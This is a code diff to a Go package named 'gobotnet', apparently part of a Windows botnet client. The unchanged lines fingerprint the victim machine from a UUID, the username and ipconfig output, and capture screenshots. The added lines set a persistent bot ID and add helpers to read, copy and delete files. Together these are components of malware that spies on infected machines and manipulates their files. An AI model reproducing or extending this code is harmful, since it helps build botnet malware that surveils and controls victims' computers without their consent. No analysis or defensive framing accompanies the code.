@@ -3,14 +3,21 @@ package gobotnet
 import (
 	//"encoding/base64"
 	"bytes"
+	"errors"
 	"fmt"
 	"github.com/satori/go.uuid"
 	"github.com/vova616/screenshot"
 	"golang.org/x/sys/windows/registry"
 	"image"
 	"image/png"
+	"io"
+	"io/ioutil"
 	"os"
 	"os/user"
+)
+
+var (
+	id uuid.UUID = uuid.NewV4()
 )
 
 func CmdTest() {
@@ -29,7 +36,7 @@ func CmdTest() {
 
 func getIdentificator() string {
 	ipConfigOut, _ := CmdExec("ipconfig")
-	return uuid.NewV4().String() + GetUsername() + string(ipConfigOut)
+	return id.String() + GetUsername() + string(ipConfigOut)
 }
 
 func GetUid() string {
@@ -72,6 +79,21 @@ func GetScreenshot() *image.RGBA {
 	return img
 }
 
+// func CheckFileExists(nameFile string) error {
+// 	fileInfo, err := os.Stat(nameFile)
+// 	if err != nil {
+// 		if os.IsNotExist(err) {
+// 			errors.New("File not exist.")
+// 		}
+// 		return err
+// 	}
+// 	return nil
+// }
+
+func ReadFile(nameFile string) (bytesFile []byte, err error) {
+	return ioutil.ReadFile(nameFile)
+}
+
 func SaveImageToFile(image *image.RGBA, nameFile string) error {
 	f, err := os.Create("./" + nameFile)
 	if err != nil {
@@ -92,4 +114,52 @@ func ImageToBytes(image *image.RGBA) ([]byte, error) {
 	err := png.Encode(buf, image)
 	imageBytes := buf.Bytes()
 	return imageBytes, err
+}
+
+func CopyFileToDirectory(pathSourceFile string, pathDestFile string) error {
+	sourceFile, err := os.Open(pathSourceFile)
+	if err != nil {
+		return err
+	}
+	defer sourceFile.Close()
+
+	destFile, err := os.Create(pathDestFile)
+	if err != nil {
+		return err
+	}
+	defer destFile.Close()
+
+	_, err = io.Copy(destFile, sourceFile)
+	if err != nil {
+		return err
+	}
+
+	err = destFile.Sync()
+	if err != nil {
+		return err
+	}
+
+	sourceFileInfo, err := sourceFile.Stat()
+	if err != nil {
+		return err
+	}
+
+	destFileInfo, err := destFile.Stat()
+	if err != nil {
+		return err
+	}
+
+	if sourceFileInfo.Size() == destFileInfo.Size() {
+	} else {
+		return errors.New("Bad copy file")
+	}
+	return nil
+}
+
+func DeleteFile(nameFile string) error {
+	err := os.Remove(nameFile)
+	if err != nil {
+		OutMessage(err.Error())
+	}
+	return err
 }
